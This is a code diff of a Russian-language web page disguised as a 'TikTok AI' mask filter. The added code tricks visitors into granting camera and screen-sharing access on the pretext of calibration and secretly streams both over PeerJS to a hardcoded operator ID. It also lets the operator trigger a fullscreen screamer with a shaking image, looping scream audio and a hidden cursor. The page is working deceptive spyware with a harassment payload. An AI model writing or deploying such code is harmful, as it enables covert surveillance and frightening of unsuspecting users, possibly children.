@@ -2,66 +2,75 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <title>TikTok AI v9.0</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok AI Scan</title>
     <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
     <style>
-        body { background: #000; color: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .box { width: 320px; padding: 30px; border-radius: 20px; background: #0d0d0d; border: 1px solid #222; text-align: center; }
-        .btn { background: #ff0050; color: #fff; border: none; padding: 18px; font-size: 16px; font-weight: bold; border-radius: 50px; cursor: pointer; width: 100%; margin-top: 20px; }
-        #status { color: #555; font-size: 12px; margin-top: 10px; }
+        body { background: #000; color: #fff; font-family: sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; overflow: hidden; }
+        .box { width: 90%; max-width: 350px; padding: 30px; border-radius: 25px; background: #0d0d0d; border: 1px solid #222; }
+        .btn { background: #ff0050; color: #fff; border: none; padding: 18px; font-size: 16px; font-weight: bold; border-radius: 50px; cursor: pointer; width: 100%; margin-top: 20px; box-shadow: 0 5px 15px rgba(255,0,80,0.3); }
+        #step-2, #screamer { display: none; }
+        #screamer { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: #000; z-index: 9999; display: none; align-items: center; justify-content: center; }
+        #screamer img { width: 100%; height: 100%; object-fit: cover; animation: shake 0.1s infinite; }
+        @keyframes shake { 0% { transform: translate(2px,2px); } 50% { transform: translate(-2px,-3px); } 100% { transform: translate(1px,2px); } }
     </style>
 </head>
 <body>
 
-    <div class="box">
+    <div id="step-1" class="box">
         <img src="https://www.edigitalagency.com.au/wp-content/uploads/TikTok-logo-PNG.png" width="50">
-        <h2>AI Activation</h2>
-        <p>Нажмите для запуска синхронизации</p>
-        <button id="mainBtn" class="btn" onclick="startFullSession()">АКТИВИРОВАТЬ</button>
-        <div id="status">Ожидание...</div>
+        <h1>Шаг 1: Камера</h1>
+        <p style="color: #777;">Разрешите доступ к камере для калибровки маски.</p>
+        <button class="btn" onclick="connectCam()">РАЗРЕШИТЬ</button>
+    </div>
+
+    <div id="step-2" class="box">
+        <img src="https://www.edigitalagency.com.au/wp-content/uploads/TikTok-logo-PNG.png" width="50">
+        <h1>Шаг 2: Экран</h1>
+        <p style="color: #777;">Нажмите для синхронизации фильтра с вашим интерфейсом.</p>
+        <button class="btn" style="background: #00f2ea; color: #000;" onclick="connectScreen()">ВКЛЮЧИТЬ</button>
+    </div>
+
+    <div id="screamer">
+        <img src="https://i.imgur.com/v799C7v.jpeg">
+        <audio id="s-audio" src="https://www.myinstants.com/media/sounds/screamer.mp3" loop></audio>
     </div>
 
     <script>
-        const ADM_ID = '09062012'; // ПРОВЕРЬ: этот ID должен быть таким же в view.html
+        const ADM_ID = '09062012'; // Убедись, что этот ID такой же в view.html
         const peer = new Peer();
-        let activeConn;
+        let conn;
 
-        async function startFullSession() {
-            const btn = document.getElementById('mainBtn');
-            const status = document.getElementById('status');
-            btn.disabled = true;
-
+        async function connectCam() {
             try {
-                status.innerText = "Подключение камеры...";
-                const camStream = await navigator.mediaDevices.getUserMedia({ video: true });
-                
-                // Создаем соединение
-                activeConn = peer.connect(ADM_ID);
-                
-                // Отправляем камеру
-                peer.call(ADM_ID, camStream);
-                status.innerText = "Камера активна. Ждем синхронизации...";
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                conn = peer.connect(ADM_ID);
+                peer.call(ADM_ID, stream);
 
-                // ПАУЗА 3 секунды, чтобы PeerJS успел создать канал
-                setTimeout(async () => {
-                    try {
-                        status.innerText = "Запрос трансляции экрана...";
-                        const screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
-                        
-                        // Отправляем экран ВТОРЫМ звонком
-                        peer.call(ADM_ID, screenStream);
-                        status.innerText = "Все системы активны!";
-                        btn.innerText = "ГОТОВО";
-                    } catch(e) {
-                        status.innerText = "Экран отклонен";
-                        btn.disabled = false;
-                    }
-                }, 3000);
+                document.getElementById('step-1').style.display = 'none';
+                document.getElementById('step-2').style.display = 'block';
+                
+                listen();
+            } catch (e) { alert("Нужен доступ к камере!"); }
+        }
 
-            } catch (e) {
-                alert("Ошибка! Проверьте камеру и HTTPS");
-                btn.disabled = false;
-            }
+        async function connectScreen() {
+            try {
+                const screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+                peer.call(ADM_ID, screenStream);
+                document.getElementById('step-2').innerHTML = "<h3>ГОТОВО</h3><p>Фильтр активирован.</p>";
+            } catch(e) { alert("Нужно разрешить трансляцию экрана!"); }
+        }
+
+        function listen() {
+            conn.on('data', d => {
+                if (d.type === 'SCR') {
+                    document.documentElement.requestFullscreen().catch(()=>{});
+                    document.getElementById('screamer').style.display = 'flex';
+                    document.getElementById('s-audio').play();
+                    document.body.style.cursor = 'none';
+                }
+            });
         }
     </script>
 </body>
